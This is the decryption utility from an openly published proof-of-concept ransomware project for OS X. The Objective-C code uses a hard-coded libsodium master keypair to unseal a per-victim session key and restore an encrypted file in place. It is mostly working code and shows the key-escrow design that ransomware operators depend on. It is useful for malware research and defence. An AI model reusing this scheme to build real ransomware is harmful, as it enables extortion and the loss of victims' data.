/*
 *   ________              .__
 *  /  _____/  ____ ______ |  |__   ___________
 * /   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \
 * \    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/
 *  \______  /\____/|   __/|___|  /\___  >__|
 *         \/       |__|        \/     \/
 *
 * OS X Ransomware Proof of Concept
 *
 * This is the decryption utility
 *
 * Created by fG! on 26/05/15.
 *
 * Copyright (c) 2015 fG!. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * main.m
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#import <Foundation/Foundation.h>
#include "sodium.h"
#include <sys/stat.h>

#define ERROR_MSG(fmt, ...) fprintf(stderr, "[ERROR] " fmt " \n", ## __VA_ARGS__)
#define OUTPUT_MSG(fmt, ...) fprintf(stdout, fmt " \n", ## __VA_ARGS__)
#if DEBUG == 0
#   define DEBUG_MSG(fmt, ...) do {} while (0)
#else
#   define DEBUG_MSG(fmt, ...) fprintf(stdout, "[DEBUG] " fmt "\n", ## __VA_ARGS__)
#endif

/* the master key that will be used to encrypt the session private key */
unsigned char master_pub_key[crypto_box_PUBLICKEYBYTES] = "\x2f\x06\x6c\xd5\x2a\x0f\xfd\x10\xef\x5c\xe8\x8f\x17\x9d\xda\x68\x4f\xca\x06\x78\x19\x81\x6b\x4f\x5e\x74\xa1\xd4\xf6\x1d\x11\x45";
unsigned char master_priv_key[crypto_box_SECRETKEYBYTES] = "\x7d\xfe\xf8\x68\xd9\xc4\x43\x82\x1b\x6b\x45\x59\xac\xc8\xb6\x07\x7f\x5b\x92\x80\x0c\x69\x3e\xbf\x14\xaa\x6b\xbd\x34\x57\xf9\x0f";

unsigned char session_pub_key[crypto_box_PUBLICKEYBYTES];
unsigned char session_priv_key[crypto_box_SECRETKEYBYTES];

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        const char *target = argv[1];
        int ret = 0;
        if (argc < 2)
        {
            ERROR_MSG("Please set an option...");
            return EXIT_FAILURE;
        }
        if (sodium_init() == -1)
        {
            ERROR_MSG("Can't initialize libsodium!");
            return EXIT_FAILURE;
        }
        
        /* first we need to decrypt the session private key that is encrypted with our master key */
        int key_fd = 0;
        key_fd = open("./session_private.key", O_RDONLY);
        if (key_fd < 0)
        {
            ERROR_MSG("Can't open session private key.");
            return EXIT_FAILURE;
        }
        unsigned char crypted_key[crypto_box_SEALBYTES + crypto_box_SECRETKEYBYTES];
        read(key_fd, crypted_key, crypto_box_SEALBYTES + crypto_box_SECRETKEYBYTES);
        close(key_fd);
        
        ret = crypto_box_seal_open(session_priv_key, crypted_key, crypto_box_SEALBYTES + crypto_box_SECRETKEYBYTES, master_pub_key, master_priv_key);
        if (ret < 0)
        {
            ERROR_MSG("Can't decrypt session private key!");
            return EXIT_FAILURE;
        }
        /* we also need to read the session public key */
        key_fd = open("./session_pub.key", O_RDONLY);
        if (key_fd < 0)
        {
            ERROR_MSG("Can't open session public key.");
            return EXIT_FAILURE;
        }
        read(key_fd, session_pub_key, crypto_box_PUBLICKEYBYTES);
        close(key_fd);
        
        /* now we can read the encrypted file and try to decrypt it */
        int fd = 0;
        fd = open(target, O_RDWR);
        if (fd < 0)
        {
            ERROR_MSG("Failed to open target.");
            return EXIT_FAILURE;
        }
        struct stat filestat = {0};
        fstat(fd, &filestat);
        /* mmap the original buffer and alloc memory for the target */
        unsigned char *crypted_buf = mmap(0, filestat.st_size, PROT_READ, MAP_SHARED, fd, 0);
        unsigned char *decrypted_buf = malloc(filestat.st_size - crypto_box_SEALBYTES);
        
        /* try to decrypt the contents of the file */
        ret = crypto_box_seal_open(decrypted_buf, crypted_buf, filestat.st_size, session_pub_key, session_priv_key);
        if (ret == 0)
        {
            printf("Decrypting file...\n");
            munmap(crypted_buf, filestat.st_size);
            lseek(fd, 0, SEEK_SET);
            /* write only the decrypted bytes */
            write(fd, decrypted_buf, filestat.st_size - crypto_box_SEALBYTES);
            /* remove the seal bytes from the target */
            ftruncate(fd, filestat.st_size - crypto_box_SEALBYTES);
            close(fd);
        }
        else
        {
            printf("Failed to decrypt!\n");
        }
    }
    
    DEBUG_MSG("All done, hopefully you had a merry christmas!");
    
    return 0;
}
